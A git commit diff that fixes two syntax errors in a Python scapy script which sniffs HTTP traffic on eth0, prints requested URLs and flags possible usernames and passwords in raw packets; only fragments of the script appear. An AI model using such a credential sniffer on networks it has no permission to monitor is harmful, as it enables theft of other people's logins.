f36f0349c2f481aca54d550ef1706171b5734f3f
jism <jenia.isler@gmx.ch>
2020-06-30 17:05:33 +0200

    fixed syntax error

--- packet_sniffer/packet_sniffer.py
+++ packet_sniffer/packet_sniffer.py
@@ -9,7 +9,7 @@ def sniff(interface):
     scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet, filter="")
 
 def get_url(packet):
-    returnpacket[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
+    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
 
 def get_login_info(packet):
     if packet.haslayer(scapy.Raw):
@@ -22,13 +22,13 @@ def process_sniffed_packet(packet):
     if packet.haslayer(http.HTTPRequest):
         #print(packet.show()) # See all Packet layer fields
         url = get_url(packet)
-        print("[+] HTTP Request >> " url)
+        print("[+] HTTP Request >> " + url)
 
         login_info = get_login_info(packet)
         if login_info:
             print("\n\n[+] Possible username/password > " + login_info + "\n\n")
 
         
-        
+
 
 sniff("eth0")
